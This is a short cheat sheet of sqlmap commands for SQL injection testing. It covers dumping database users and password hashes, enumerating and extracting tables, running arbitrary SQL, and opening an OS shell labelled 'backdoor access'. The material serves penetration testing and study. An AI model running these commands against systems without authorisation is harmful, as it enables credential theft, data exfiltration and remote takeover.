# SQLMAP

## Test URL and POST data and return database banner (if possible)

```shell
./sqlmap.py --url="<url>" --data="<post-data>" --banner
```

## Parse request data and test | request data can be obtained with burp

```shell
./sqlmap.py -r <request-file> <options>
```

## Fingerprint | much more information than banner

```shell
./sqlmap.py -r <request-file> --fingerprint
```

## Get database username, name, and hostname

```shell
./sqlmap.py -r <request-file> --current-user --current-db --hostname
```

## Check if user is a database admin

```shell
./sqlmap.py -r <request-file> --is-dba
```

## Get database users and password hashes

```shell
./sqlmap.py -r <request-file> --users --passwords
```

## Enumerate databases

```shell
./sqlmap.py -r <request-file> --dbs
```

## List tables for one database

```shell
./sqlmap.py -r <request-file> -D <db-name> --tables
```

## Other database commands

```shell
./sqlmap.py -r <request-file> -D <db-name> --columns
					   --schema
					   --count
```

## Enumeration flags

```shell
./sqlmap.py -r <request-file> -D <db-name>
			      -T <tbl-name>
			      -C <col-name>
			      -U <user-name>
```

## Extract data

```shell
./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump
```

## Execute SQL Query

```shell
./sqlmap.py -r <request-file> --sql-query="<sql-query>"
```

## Append/Prepend SQL Queries

```shell
./sqlmap.py -r <request-file> --prefix="<sql-query>" --suffix="<sql-query>"
```

## Get backdoor access to sql server | can give shell access

```shell
./sqlmap.py -r <request-file> --os-shell
```
